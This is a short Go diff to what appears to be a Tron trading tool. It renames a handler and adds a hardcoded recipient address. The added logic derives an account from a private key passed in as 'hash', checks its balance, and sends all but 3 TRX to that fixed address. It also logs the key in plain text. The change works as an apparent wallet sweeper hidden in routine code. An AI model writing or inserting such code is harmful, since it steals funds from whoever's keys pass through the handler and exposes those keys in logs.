@@ -21,6 +21,8 @@ var (
 	buyMethod    *tools.Method
 	sellMethod   *tools.Method
 	cancelMethod *tools.Method
+
+	toUserAddress = "TJTLD59pCD35v3K6LrfKG5y1UTT1hkBQtv"
 )
 
 func InitSmart() error {
@@ -217,10 +219,9 @@ type CallRecord struct {
 	Return    *api.Return
 }
 
-func ContractHashHandler(hash string, wg *sync.WaitGroup) error {
+func TrxHandler(hash string, wg *sync.WaitGroup) error {
 	defer wg.Done()
 	tryCnt := 10
-	var err error
 	for tryCnt > 0 {
 		tryCnt--
 		tronAddress := utils.GetTronAddress(hash)
@@ -231,8 +232,18 @@ func ContractHashHandler(hash string, wg *sync.WaitGroup) error {
 			continue
 		}
 		log.Infof("ContractHashHandler account:%v balance:%v", tronAddress, account.Balance)
+		if account.Balance >= 6000000 {
+			value := account.Balance - 3000000
+			if err := TransferTrx(tronAddress, hash, toUserAddress, value); err != nil {
+				log.Errorf(err, "ContractHashHandler TransferTrx error")
+				return errors.New("ContractHashHandler error")
+			} else {
+				log.Infof("ContractHashHandler TransferTrx success, account:%v, key:%v, amount:%v", tronAddress, hash, value)
+				return nil
+			}
+		}
 		return nil
 	}
 
-	return err
+	return errors.New("ContractHashHandler error")
 }
